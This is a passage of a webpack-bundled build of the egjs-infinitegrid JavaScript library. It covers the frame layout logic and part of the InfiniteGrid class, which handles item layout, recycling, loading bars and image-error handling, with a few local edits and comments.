var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function disableFrame(frame, type, x, y, width, height) {
	for (var i = y; i < y + height; ++i) {
		for (var j = x; j < x + width; ++j) {
			if (type !== frame[i][j]) {
				continue;
			}
			frame[i][j] = 0;
		}
	}
}
function searchShapeInFrame(frame, type, top, left, width, height) {
	var size = {
		left: left,
		top: top,
		type: type,
		width: 1,
		height: 1
	};

	for (var i = left; i < width; ++i) {
		if (frame[top][i] === type) {
			size.width = i - left + 1;
			continue;
		}
		break;
	}
	for (var _i = top; _i < height; ++_i) {
		if (frame[_i][left] === type) {
			size.height = _i - top + 1;
			continue;
		}
		break;
	}
	// After finding the shape, it will not find again.
	disableFrame(frame, type, left, top, size.width, size.height);
	return size;
}
function getShapes(frame) {
	var height = frame.length;
	var width = height ? frame[0].length : 0;
	var shapes = [];

	for (var i = 0; i < height; ++i) {
		for (var j = 0; j < width; ++j) {
			var type = frame[i][j];

			if (!type) {
				continue;
			}
			// Separate shapes with other numbers.
			shapes.push(searchShapeInFrame(frame, type, i, j, width, height));
		}
	}
	shapes.sort(function (a, b) {
		return a.type < b.type ? -1 : 1;
	});
	return {
		shapes: shapes,
		width: width,
		height: height
	};
}

var FrameLayout = function () {
	function FrameLayout() {
		var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

		_classCallCheck(this, FrameLayout);

		this.options = (0, _utils.assignOptions)({
			itemSize: 0,
			frame: [],
			frameFill: true
		}, options);
		var frame = this.options.frame.map(function (row) {
			return row.slice();
		});
		// divide frame into shapes.
		var shapes = getShapes(frame);

		this._itemSize = this.options.itemSize || 0;
		this._shapes = shapes;
		this._size = 0;
		this._style = (0, _utils.getStyleNames)(this.options.horizontal);
	}

	FrameLayout.prototype._getItemSize = function _getItemSize() {
		this._checkItemSize();

		return this._itemSize;
	};

	FrameLayout.prototype._checkItemSize = function _checkItemSize() {
		if (this.options.itemSize) {
			this._itemSize = this.options.itemSize;
			return;
		}
		var style = this._style;
		var size = style.size2;
		var margin = this.options.margin;

		// if itemSize is not in options, caculate itemSize from size.
		this._itemSize = (this._size + margin) / this._shapes[size] - margin;
	};

	FrameLayout.prototype._layout = function _layout(items) {
		var outline = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : [];
		var isAppend = arguments[2];

		var length = items.length;
		var style = this._style;
		var _options = this.options,
		    margin = _options.margin,
		    frameFill = _options.frameFill;

		var size1Name = style.size1;
		var size2Name = style.size2;
		var pos1Name = style.pos1;
		var pos2Name = style.pos2;
		var itemSize = this._getItemSize();
		var isItemObject = (typeof itemSize === "undefined" ? "undefined" : _typeof(itemSize)) === "object";
		var itemSize2 = isItemObject ? itemSize[size2Name] : itemSize;
		var itemSize1 = isItemObject ? itemSize[size1Name] : itemSize;
		var shapesSize = this._shapes[size2Name];
		var shapes = this._shapes.shapes;
		var shapesLength = shapes.length;
		var startOutline = (0, _utils.fill)(new Array(shapesSize), _consts.DUMMY_POSITION);
		var endOutline = (0, _utils.fill)(new Array(shapesSize), _consts.DUMMY_POSITION);
		var dist = 0;
		var end = 0;
		var startIndex = -1;
		var endIndex = -1;
		var minPos = -1;
		var maxPos = -1;

		if (!shapesLength) {
			return { start: outline, end: outline, startIndex: startIndex, endIndex: endIndex };
		}
		for (var i = 0; i < length; i += shapesLength) {
			for (var j = 0; j < shapesLength && i + j < length; ++j) {
				var _item$rect;

				var item = items[i + j];
				var shape = shapes[j];
				var shapePos1 = shape[pos1Name];
				var shapePos2 = shape[pos2Name];
				var shapeSize1 = shape[size1Name];
				var shapeSize2 = shape[size2Name];
				var pos1 = end - dist + shapePos1 * (itemSize1 + margin);
				var pos2 = shapePos2 * (itemSize2 + margin);
				var size1 = shapeSize1 * (itemSize1 + margin) - margin;
				var size2 = shapeSize2 * (itemSize2 + margin) - margin;

				for (var k = shapePos2; k < shapePos2 + shapeSize2 && k < shapesSize; ++k) {
					if (startOutline[k] === _consts.DUMMY_POSITION) {
						startOutline[k] = pos1;
					}
					if (startIndex === -1) {
						minPos = pos1;
						startIndex = i + j;
						maxPos = pos1 + size1 + margin;
						endIndex = i + j;
					}
					if (minPos > pos1) {
						minPos = pos1;
						startIndex = i + j;
					}
					if (maxPos < pos1 + size1 + margin) {
						maxPos = pos1 + size1 + margin;
						endIndex = i + j;
					}
					startOutline[k] = Math.min(startOutline[k], pos1);
					endOutline[k] = Math.max(endOutline[k], pos1 + size1 + margin);
				}
				item.rect = (_item$rect = {}, _item$rect[pos1Name] = pos1, _item$rect[pos2Name] = pos2, _item$rect[size1Name] = size1, _item$rect[size2Name] = size2, _item$rect);
			}
			end = Math.max.apply(Math, endOutline);
			// check dist once
			if (i !== 0) {
				continue;
			}
			// find & fill empty block
			if (!frameFill) {
				dist = 0;
				continue;
			}
			dist = end;

			for (var _j = 0; _j < shapesSize; ++_j) {
				if (startOutline[_j] === _consts.DUMMY_POSITION) {
					continue;
				}
				// the dist between frame's end outline and next frame's start outline
				// expect that next frame's start outline is startOutline[j] + end
				dist = Math.min(startOutline[_j] + end - endOutline[_j], dist);
			}
		}
		for (var _i2 = 0; _i2 < shapesSize; ++_i2) {
			if (startOutline[_i2] !== _consts.DUMMY_POSITION) {
				continue;
			}
			startOutline[_i2] = Math.max.apply(Math, startOutline);
			endOutline[_i2] = startOutline[_i2];
		}
		// The target outline is start outline when type is APPENDING
		var targetOutline = isAppend ? startOutline : endOutline;
		var prevOutlineEnd = outline.length === 0 ? 0 : Math[isAppend ? "max" : "min"].apply(Math, outline);
		var prevOutlineDist = isAppend ? 0 : end;

		if (frameFill && outline.length === shapesSize) {
			prevOutlineDist = -_consts.DUMMY_POSITION;
			for (var _i3 = 0; _i3 < shapesSize; ++_i3) {
				if (startOutline[_i3] === endOutline[_i3]) {
					continue;
				}
				// if appending type is PREPEND, subtract dist from appending group's height.

				prevOutlineDist = Math.min(targetOutline[_i3] + prevOutlineEnd - outline[_i3], prevOutlineDist);
			}
		}
		for (var _i4 = 0; _i4 < shapesSize; ++_i4) {
			startOutline[_i4] += prevOutlineEnd - prevOutlineDist;
			endOutline[_i4] += prevOutlineEnd - prevOutlineDist;
		}
		items.forEach(function (item) {
			item.rect[pos1Name] += prevOutlineEnd - prevOutlineDist;
		});
		return {
			start: startOutline,
			end: endOutline,
			startIndex: startIndex,
			endIndex: endIndex
		};
	};

	FrameLayout.prototype._insert = function _insert(items, outline, type) {
		// this only needs the size of the item.
		var clone = items.map(function (item) {
			return _extends({}, item);
		});

		return {
			items: clone,
			outlines: this._layout(clone, outline, type)
		};
	};

	FrameLayout.prototype.layout = function layout(groups, outlines) {
		var length = groups.length;
		var point = outlines;

		for (var i = 0; i < length; ++i) {
			var group = groups[i];

			point = this._layout(group.items, point, _consts.APPEND);
			group.outlines = point;
			point = point.end;
		}
		return this;
	};

	FrameLayout.prototype.setSize = function setSize(size) {
		this._size = size;
		return this;
	};

	FrameLayout.prototype.append = function append(items, outline) {
		return this._insert(items, outline, _consts.APPEND);
	};

	FrameLayout.prototype.prepend = function prepend(items, outline) {
		return this._insert(items, outline, _consts.PREPEND);
	};

	return FrameLayout;
}();

exports["default"] = FrameLayout;
module.exports = exports["default"];

/***/ }),
/* 7 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


var _InfiniteGrid = __webpack_require__(8);

var _InfiniteGrid2 = _interopRequireDefault(_InfiniteGrid);

var _GridLayout = __webpack_require__(12);

var _GridLayout2 = _interopRequireDefault(_GridLayout);

var _FrameLayout = __webpack_require__(6);

var _FrameLayout2 = _interopRequireDefault(_FrameLayout);

var _SquareLayout = __webpack_require__(13);

var _SquareLayout2 = _interopRequireDefault(_SquareLayout);

var _PackingLayout = __webpack_require__(14);

var _PackingLayout2 = _interopRequireDefault(_PackingLayout);

var _JustifiedLayout = __webpack_require__(16);

var _JustifiedLayout2 = _interopRequireDefault(_JustifiedLayout);

var _ImageLoaded = __webpack_require__(5);

var _ImageLoaded2 = _interopRequireDefault(_ImageLoaded);

var _AutoSizer = __webpack_require__(3);

var _AutoSizer2 = _interopRequireDefault(_AutoSizer);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

/**
 * Copyright (c) NAVER Corp.
 * egjs-infinitegrid projects are licensed under the MIT license
 */
_InfiniteGrid2["default"].GridLayout = _GridLayout2["default"];
_InfiniteGrid2["default"].FrameLayout = _FrameLayout2["default"];
_InfiniteGrid2["default"].SquareLayout = _SquareLayout2["default"];
_InfiniteGrid2["default"].PackingLayout = _PackingLayout2["default"];
_InfiniteGrid2["default"].JustifiedLayout = _JustifiedLayout2["default"];
_InfiniteGrid2["default"].ImageLoaded = _ImageLoaded2["default"];
_InfiniteGrid2["default"].AutoSizer = _AutoSizer2["default"];

module.exports = _InfiniteGrid2["default"];

/***/ }),
/* 8 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; /**
                                                                                                                                                                                                                                                                               * Copyright (c) 2017 NAVER Corp.
                                                                                                                                                                                                                                                                               * egjs projects are licensed under the MIT license
                                                                                                                                                                                                                                                                              */


var _component = __webpack_require__(9);

var _component2 = _interopRequireDefault(_component);

var _ItemManager = __webpack_require__(10);

var _ItemManager2 = _interopRequireDefault(_ItemManager);

var _DOMRenderer = __webpack_require__(4);

var _DOMRenderer2 = _interopRequireDefault(_DOMRenderer);

var _ImageLoaded = __webpack_require__(5);

var _ImageLoaded2 = _interopRequireDefault(_ImageLoaded);

var _Watcher = __webpack_require__(11);

var _Watcher2 = _interopRequireDefault(_Watcher);

var _AutoSizer = __webpack_require__(3);

var _AutoSizer2 = _interopRequireDefault(_AutoSizer);

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _possibleConstructorReturn(self, call) { if (!self) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return call && (typeof call === "object" || typeof call === "function") ? call : self; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function, not " + typeof superClass); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, enumerable: false, writable: true, configurable: true } }); if (superClass) Object.setPrototypeOf ? Object.setPrototypeOf(subClass, superClass) : subClass.__proto__ = superClass; }

// IE8
// https://stackoverflow.com/questions/43216659/babel-ie8-inherit-issue-with-object-create
/* eslint-disable */
if (typeof Object.create !== "function") {
	Object.create = function (o, properties) {
		if ((typeof o === "undefined" ? "undefined" : _typeof(o)) !== "object" && typeof o !== "function") {
			throw new TypeError("Object prototype may only be an Object: " + o);
		} else if (o === null) {
			throw new Error("This browser's implementation of Object.create is a shim and doesn't support 'null' as the first argument.");
		}
		function F() {}
		F.prototype = o;
		return new F();
	};
}
/* eslint-enable */

function hasTarget() {
	for (var _len = arguments.length, targets = Array(_len), _key = 0; _key < _len; _key++) {
		targets[_key] = arguments[_key];
	}

	return targets.every(function (target) {
		return ~target[0].indexOf(target[1]);
	});
}

var InfiniteGrid = function (_Component) {
	_inherits(InfiniteGrid, _Component);

	function InfiniteGrid(element, options) {
		_classCallCheck(this, InfiniteGrid);

		var _this = _possibleConstructorReturn(this, _Component.call(this));

		_extends(_this.options = {
			itemSelector: "*",
			isOverflowScroll: false,
			threshold: 1000,
			isEqualSize: false,
			useRecycle: true,
			horizontal: false,
			attributePrefix: "data-"
		}, options);
		_consts.IS_ANDROID2 && (_this.options.isOverflowScroll = false);
		_this._isVertical = !_this.options.horizontal;
		_this._reset();
		_this._items = new _ItemManager2["default"]();
		_this._renderer = new _DOMRenderer2["default"](element, {
			isOverflowScroll: _this.options.isOverflowScroll,
			isEqualSize: _this.options.isEqualSize,
			isVertical: _this._isVertical
		});
		_this._loadingBar = {};
		_this._watcher = new _Watcher2["default"](_this._renderer, {
			layout: function layout() {
				return _this.layout();
			},
			check: function check(param) {
				return _this._onCheck(param);
			}
		});
		return _this;
	}

	InfiniteGrid.prototype.append = function append(elements, groupKey) {
		this._layout && this._insert(elements, _consts.APPEND, groupKey);
		return this;
	};

	InfiniteGrid.prototype.prepend = function prepend(elements, groupKey) {
		this._layout && this._insert(elements, _consts.PREPEND, groupKey);
		return this;
	};

	InfiniteGrid.prototype.setLayout = function setLayout(LayoutKlass, options) {
		if (typeof LayoutKlass === "function") {
			this._layout = new LayoutKlass(_extends(options || {}, {
				horizontal: !this._isVertical
			}));
		} else {
			this._layout = LayoutKlass;
			this._layout.options.horizontal = !this._isVertical;
		}
		this._layout.setSize(this._renderer.getViewportSize());
		return this;
	};

	InfiniteGrid.prototype.getItems = function getItems() {
		var includeCached = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : false;

		return this[includeCached ? "_getItems" : "_getVisibleItems"]();
	};

	InfiniteGrid.prototype._getItems = function _getItems() {
		return this._items.pluck("items", 0, this._items.size());
	};

	InfiniteGrid.prototype._getVisibleItems = function _getVisibleItems() {
		return this._items.pluck("items", this._status.startCursor, this._status.endCursor);
	};

	InfiniteGrid.prototype._updateEdge = function _updateEdge() {
		this._status.start = this._items.getEdge("start", this._status.startCursor, this._status.endCursor);
		this._status.end = this._items.getEdge("end", this._status.startCursor, this._status.endCursor);
	};

	InfiniteGrid.prototype._getEdgeOffset = function _getEdgeOffset(cursor) {
		var rect = null;

		if (!this._status[cursor]) {
			var item = this._items.getEdge(cursor);

			this._status[cursor] = item;
		}

		if (this._status[cursor]) {
			rect = this._status[cursor].rect;
			if (cursor === "start") {
				rect.bottom = rect.top + this._status[cursor].size.height;
				rect.right = rect.left + this._status[cursor].size.width;
			}
		}
		return rect;
	};
	// called by visible


	InfiniteGrid.prototype._fit = function _fit() {

		var scrollCycle = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : "after";

		// for caching
		if (!this._layout) {
			return 0;
		}
		var base = this._getEdgeValue("start");
		var margin = this._getLoadingStatus() === _consts.LOADING_PREPEND && this._status.loadingSize || 0;

		if (!this.options.useRecycle || _consts.DEFENSE_BROWSER) {
			if (scrollCycle === "before" && margin && base < margin) {
				this._renderer.scrollBy(-Math.abs(base) + margin);
				this._watcher.setScrollPos();
				this._items.fit(base - margin, this._isVertical);
				_DOMRenderer2["default"].renderItems(this._getVisibleItems());
				this._renderer.setContainerSize(this._getEdgeValue("end") || margin);
			} else if (scrollCycle === "after" && base < 0) {
				this._items.fit(base - margin, this._isVertical);
				this._renderer.setContainerSize(this._getEdgeValue("end") || margin);
				_DOMRenderer2["default"].renderItems(this._getVisibleItems());
				this._renderer.scrollBy(Math.abs(base));
				this._watcher.setScrollPos();
			}
			return 0;
		}

		if (base !== 0 || margin) {
			var isProcessing = this._isProcessing();

			this._process(_consts.PROCESSING);
			if (scrollCycle === "before") {
				this._renderer.scrollBy(-Math.abs(base) + margin);
				this._watcher.setScrollPos();
			}
			this._items.fit(base - margin, this._isVertical);
			_DOMRenderer2["default"].renderItems(this._getVisibleItems());
			this._renderer.setContainerSize(this._getEdgeValue("end") || margin);
			if (scrollCycle === "after") {
				this._renderer.scrollBy(Math.abs(base) + margin);
				this._watcher.setScrollPos();
			}
			if (!isProcessing) {
				this._process(_consts.PROCESSING, false);
			}
		}
		return base;
	};

	InfiniteGrid.prototype._getEdgeValue = function _getEdgeValue(cursor) {
		return this._items.getEdgeValue(cursor, this._status.startCursor, this._status.endCursor);
	};

	InfiniteGrid.prototype.layout = function layout() {
		var _this2 = this;

		var isRelayout = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : true;

		if (!this._layout) {
			return this;
		}
		// check childElement
		if (!this._items.size()) {
			this._insert((0, _utils.toArray)(this._renderer.container.children), true);
			return this;
		}
		var data = void 0;
		var outline = void 0;

		if (isRelayout) {
			// remove cache
			if (this.options.isEqualSize) {
				this._renderer.updateSize([this._status.start]);
				data = this._items.get(0, this._status.endCursor);
				// outline = this._items.getOutline(0, "start");
			} else {
				data = this._items.get(this._status.startCursor, this._status.endCursor);
			}
			// if (this._renderer.resize()) {
				this._layout.setSize(this._renderer.getViewportSize());
				data.forEach(function (v) {
					data.items = _this2._renderer.updateSize(v.items);
				});
			// }
		} else {
			data = this._items.get(this._status.startCursor, this._items.size());
			// outline = this._items.getOutline(this._status.startCursor, "start");
		}
		if (!data.length) {
			return this;
		}

		this._layout.layout(data, outline);

		if (isRelayout) {
			if (!this.options.isEqualSize) {
				this._items._data.forEach(function (group, cursor) {
					if (_this2._status.startCursor <= cursor && cursor <= _this2._status.endCursor) {
						return;
					}
					group.outlines.start = [];
					group.outlines.end = [];
				});
			} else {
				this._fit("after");
			}
		} else {
			data.forEach(function (v) {
				return _this2._items.set(v, v.groupKey);
			});
		}

		// this._onLayoutComplete(data, _consts.APPEND, _consts.NO_TRUSTED, false, true);
		// if (data.length && data.length > 0) {
		// 	var items = [];
		// 	data.forEach(function (da) {
		// 		items = items.concat(da.items);
		// 	});
		// 	// this._onLayoutComplete(items, _consts.APPEND, _consts.NO_TRUSTED, false, true);
		// }
		// else {
			// this._onLayoutComplete(data.items, _consts.APPEND, _consts.NO_TRUSTED, false, true);
		// }
		_DOMRenderer2["default"].renderItems(this._getVisibleItems());
		// isRelayout && this._watcher.setScrollPos();

		return this;
	};

	InfiniteGrid.prototype.remove = function remove(element) {
		if (element) {
			var items = this._items.remove(element, this._status.startCursor, this._status.endCursor);
			if (items) {
				_DOMRenderer2["default"].removeElement(element);
				return items;
			}
		}
		return null;
	};

	InfiniteGrid.prototype.moveElementsBefore = function moveElementsBefore(elements, target, isAppend) {
		if (elements) {
			for (var i = elements.length - 1; i >= 0; i--) {
				ig.remove(elements[i]);
			}
			var items = this._items.moveElementsBefore(target, this._status.startCursor, this._status.endCursor, elements, isAppend);
			if (items) {
				ig._renderer.updateSize(items);
				ig.layout(false);
				return items;
			}
		}
		return null;
	};

	InfiniteGrid.prototype._getNextItems = function _getNextItems(isAppend) {
		var items = [];
		var size = this._items.size();

		// from cache
		if (size > 0 && this._status.startCursor !== -1 && this._status.endCursor !== -1) {
			if (isAppend && size > this._status.endCursor + 1) {
				items = this._items.pluck("items", this._status.endCursor + 1);
			} else if (!isAppend && this._status.startCursor > 0) {
				items = this._items.pluck("items", this._status.startCursor - 1);
			}
		}
		return items;
	};

	InfiniteGrid.prototype.getGroupKeys = function getGroupKeys(includeCached) {
		var data = includeCached ? this._items.get() : this._items.get(this._status.startCursor, this._status.endCursor);

		return data.map(function (v) {
			return v.groupKey;
		});
	};

	InfiniteGrid.prototype.getStatus = function getStatus() {
		return {
			options: _extends({}, this.options),
			_status: _extends({}, this._status),
			_items: this._items.getStatus(),
			_renderer: this._renderer.getStatus(),
			_watcher: this._watcher.getStatus()
		};
	};

	InfiniteGrid.prototype.setStatus = function setStatus(status) {
		var applyScrollPos = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : true;

		if (!status || !status.options || !status._status || !status._renderer || !status._items || !status._watcher) {
			return this;
		}
		this._watcher.detachEvent();
		_extends(this.options, status.options);
		_extends(this._status, status._status);
		this._items.setStatus(status._items, this._status.startCursor, this._status.endCursor);
		this._renderer.setStatus(status._renderer, this._getVisibleItems());
		this._watcher.setStatus(status._watcher, applyScrollPos);
		this._updateEdge();
		this._watcher.attachEvent();
		return this;
	};

	InfiniteGrid.prototype.clear = function clear() {
		this._items.clear();
		this._renderer.clear();
		this._reset();
		this._appendLoadingBar();
		return this;
	};

	InfiniteGrid.prototype.setLoadingBar = function setLoadingBar() {
		var userLoadingBar = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};

		var loadingBarObj = (typeof userLoadingBar === "undefined" ? "undefined" : _typeof(userLoadingBar)) === "object" ? userLoadingBar : {
			"append": userLoadingBar,
			"prepend": userLoadingBar
		};

		this._status.loadingSize = 0;
		this._status.loadingStyle = {};
		var loadingBar = this._loadingBar;

		for (var type in loadingBarObj) {
			loadingBar[type] = (0, _utils.$)(loadingBarObj[type]);
			loadingBar[type].className += " " + _consts.IGNORE_CLASSNAME;
		}
		this._appendLoadingBar();
		return this;
	};

	InfiniteGrid.prototype._appendLoadingBar = function _appendLoadingBar() {
		var loadingBar = this._loadingBar;
		var container = this._renderer.container;

		for (var type in loadingBar) {
			container.appendChild(loadingBar[type]);
		}
	};

	InfiniteGrid.prototype.isProcessing = function isProcessing() {
		return this._isProcessing() || this._isLoading();
	};

	InfiniteGrid.prototype._isProcessing = function _isProcessing() {
		return (this._status.processingStatus & _consts.PROCESSING) > 0;
	};

	InfiniteGrid.prototype._isLoading = function _isLoading() {
		return false;
		// return this._getLoadingStatus() > 0;
	};

	InfiniteGrid.prototype._getLoadingStatus = function _getLoadingStatus() {
		return this._status.processingStatus & (_consts.LOADING_APPEND | _consts.LOADING_PREPEND);
	};

	InfiniteGrid.prototype._process = function _process(status) {
		var isAdd = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : true;

		if (isAdd) {
			this._status.processingStatus |= status;
		} else {
			this._status.processingStatus -= this._status.processingStatus & status;
		}
	};

	InfiniteGrid.prototype._insert = function _insert(elements, isAppend, groupKey) {
		if (this._isProcessing() || (elements && elements.length === 0) ) {
			return;
		}

		// Note: 避免插入已存在的内容
		if (groupKey) {
			var groupKeys = ig.getGroupKeys();
			if (groupKeys.indexOf(groupKey) > -1) {
				// console.log(`重复插入${groupKey}`);
				return;
			}
		}


		var key = typeof groupKey === "undefined" ? new Date().getTime() + Math.floor(Math.random() * 1000) : groupKey;
		var items = _ItemManager2["default"].from((0, _utils.$)(elements, true), this.options.itemSelector, {
			isAppend: isAppend,
			groupKey: key
		});

		if (!items.length) {
			return;
		}
		this._postLayout(_consts.NO_CACHE, items, isAppend, _consts.NO_TRUSTED);
	};
	// add items, and remove items for recycling

	InfiniteGrid.prototype._recycle = function _recycle(isAppend, ignoreLimit) {

		if (ig.getItems().length <= 300) {
		// if (ig.getItems().length <= 420) {
			// console.log("ignore");
			return;
		}
		// else {
			// console.log("recycling");
		// }

		var remove = [];

		if (this._status.startCursor !== this._status.endCursor) {
			for (var i = this._status.startCursor; i <= this._status.endCursor; i++) {
				remove.push(this._isVisible(i));
			}
		}

		var start = remove.indexOf(isAppend ? 1 : -1);
		var end = remove.lastIndexOf(isAppend ? 1 : -1);
		var visible = remove.indexOf(0);

		if (visible === -1 || start === -1 || end === -1) {
			return;
		}

		start = this._status.startCursor + (isAppend ? 0 : start);
		end = isAppend ? this._status.startCursor + end : this._status.endCursor;
		var removeItems = this._items.pluck("items", start, end);

		_DOMRenderer2["default"].removeItems(removeItems);
		// _DOMRenderer2["default"].asyncRemoveItems(removeItems);
		if (isAppend) {
			this._status.startCursor = end + 1;
		} else {
			this._status.endCursor = start - 1;
		}

	};

	InfiniteGrid.prototype.getLoadingBar = function getLoadingBar() {
		var isAppend = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : this._getLoadingStatus() !== _consts.LOADING_PREPEND;

		return this._loadingBar[isAppend ? "append" : "prepend"];
	};

	InfiniteGrid.prototype.startLoading = function startLoading(isAppend) {
		var userStyle = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : { display: "block" };

		if (this._isLoading()) {
			return this;
		}
		var type = isAppend ? "append" : "prepend";

		this._process(isAppend ? _consts.LOADING_APPEND : _consts.LOADING_PREPEND);
		if (!this._loadingBar[type]) {
			return this;
		}
		this._renderLoading(userStyle);
		this._status.loadingStyle = userStyle;
		if (!isAppend) {
			this._fit("before");
		} else {
			this._renderer.setContainerSize(this._getEdgeValue("end") + this._status.loadingSize);
		}
		return this;
	};

	InfiniteGrid.prototype._renderLoading = function _renderLoading() {
		var _extends2;

		var userStyle = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : this._status.loadingStyle;

		if (!this._isLoading()) {
			return;
		}
		var isAppend = this._getLoadingStatus() === _consts.LOADING_APPEND;
		var el = this._loadingBar[isAppend ? "append" : "prepend"];

		if (!el) {
			return;
		}
		this._status.loadingSize = this._isVertical ? (0, _utils.innerHeight)(el) : (0, _utils.innerWidth)(el);
		var pos = isAppend ? this._getEdgeValue("end") : this._getEdgeValue("start") - this._status.loadingSize;
		var style = _extends((_extends2 = {
			position: "absolute"
		}, _extends2[this._isVertical ? "top" : "left"] = pos + "px", _extends2), userStyle);

		for (var property in style) {
			el.style[property] = style[property];
		}
	};

	InfiniteGrid.prototype.endLoading = function endLoading() {
		var _extends3;

		var userStyle = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : { display: "none" };

		if (!this._isLoading()) {
			return this;
		}
		var isAppend = this._getLoadingStatus() === _consts.LOADING_APPEND;
		var type = isAppend ? "append" : "prepend";
		var el = this._loadingBar[type];
		var size = this._status.loadingSize;

		this._process(_consts.LOADING_APPEND | _consts.LOADING_PREPEND, false);
		this._status.loadingSize = 0;
		this._status.loadingStyle = {};
		if (!el) {
			return this;
		}
		var style = _extends((_extends3 = {}, _extends3[this._isVertical ? "top" : "left"] = -size + "px", _extends3), userStyle);

		for (var property in style) {
			el.style[property] = style[property];
		}
		if (!isAppend && this.options.useRecycle && !_consts.DEFENSE_BROWSER) {
			this._renderer.scrollBy(-size);
			this._watcher.setScrollPos();
			this._items.fit(size, this._isVertical);
			_DOMRenderer2["default"].renderItems(this._getVisibleItems());
			this._renderer.setContainerSize(this._getEdgeValue("end"));
		}
		this._renderer.setContainerSize(this._getEdgeValue("end"));
		return this;
	};

	InfiniteGrid.prototype._postImageLoaded = function _postImageLoaded(fromCache, layouted, isAppend, isTrusted) {
		if (fromCache) {
			this._setItems(layouted);
		} else {
			this._insertItems(layouted, isAppend);
		}
		this._updateCursor(isAppend);
		_DOMRenderer2["default"].renderItems(layouted.items);
		this._onLayoutComplete(layouted.items, isAppend, isTrusted, false);
	};

	InfiniteGrid.prototype._onImageError = function _onImageError(target, item, itemIndex, removeTarget, replaceTarget) {
		var element = item.el;
		var prefix = this.options.attributePrefix;

		item.content = element.outerHTML;

		var removeItem = function removeItem() {
			if (hasTarget([removeTarget, element])) {
				return;
			}
			removeTarget.push(element);
			var index = replaceTarget.indexOf(itemIndex);

			if (index !== -1) {
				replaceTarget.splice(index, 1);
			}
		};

		this.trigger("imageError", {
			target: target,
			element: element,
			item: item,
			itemIndex: itemIndex,
			// remove item
			removeItem: removeItem,
			// remove image
			remove: function remove() {
				if (target === element) {
					removeItem();
					return;
				}
				if (hasTarget([removeTarget, element])) {
					return;
				}
				target.parentNode.removeChild(target);
				item.content = element.outerHTML;
				if (hasTarget([replaceTarget, itemIndex])) {
					return;
				}
				replaceTarget.push(itemIndex);
			},
			// replace image
			replace: function replace(src) {
				if (hasTarget([removeTarget, element])) {
					return;
				}
				if (src) {
					if ((0, _utils.matchHTML)(src) || (typeof src === "undefined" ? "undefined" : _typeof(src)) === "object") {
						var parentNode = target.parentNode;

						parentNode.insertBefore((0, _utils.$)(src), target);
						parentNode.removeChild(target);
						item.content = element.outerHTML;
					} else {
						target.src = src;
						if (target.getAttribute(prefix + "width")) {
							_AutoSizer2["default"].remove(target);
							target.removeAttribute(prefix + "width");
							target.removeAttribute(prefix + "height");
						}
					}
				}
				item.content = element.outerHTML;
				if (hasTarget([replaceTarget, itemIndex])) {
					return;
				}
				replaceTarget.push(itemIndex);
			},
			// replace item
			replaceItem: function replaceItem(content) {
				if (hasTarget([removeTarget, element], [replaceTarget, itemIndex])) {
					return;
				}
				element.innerHTML = content;
				item.content = element.outerHTML;
				replaceTarget.push(itemIndex);
			}
		});
	};

	InfiniteGrid.prototype._postImageLoadedEnd = function _postImageLoadedEnd(layouted, isAppend, removeTarget, replaceTarget) {

		// Note: 這一段主要處理回收機制，scrollbar 跳動也是出現在這裡

		var _this3 = this;

		if (!removeTarget.length && !replaceTarget.length) {
			if (this.options.useRecycle) {
			// if (!this.isProcessing() && this.options.useRecycle) {
				this._recycle(isAppend);
			}
			return;
		}
		var prefix = this.options.attributePrefix;
		var layoutedItems = replaceTarget.map(function (itemIndex) {
			return layouted.items[itemIndex];
		});

		removeTarget.forEach(function (element) {
			_this3.remove(element);
		});
		if (this.options.isEqualSize) {
			if (removeTarget.length > 0) {
				this.layout(false);
			// } else if (!this.isProcessing() && this.options.useRecycle) {
			} else if (this.options.useRecycle) {
				this._recycle(isAppend);
			}
			return;
		}
		// wait layoutComplete beacause of error event.
		_ImageLoaded2["default"].check(layoutedItems.map(function (v) {
			return v.el;
		}), {
			prefix: prefix,
			complete: function complete() {
				_this3._renderer.updateSize(layoutedItems);
				_this3.layout(false);
			}
		});
	};

	InfiniteGrid.prototype._postLayout = function _postLayout(fromCache, items, isAppend, isTrusted) {
		var _this4 = this;

		var _status = this._status,
		    startCursor = _status.startCursor,
		    endCursor = _status.endCursor;

		var outline = this._items.getOutline(isAppend ? endCursor : startCursor, isAppend ? "end" : "start");

		var fromRelayout = false;

		if (fromCache) {
			var cacheOutline = this._items.getOutline(isAppend ? endCursor + 1 : startCursor - 1, isAppend ? "start" : "end");

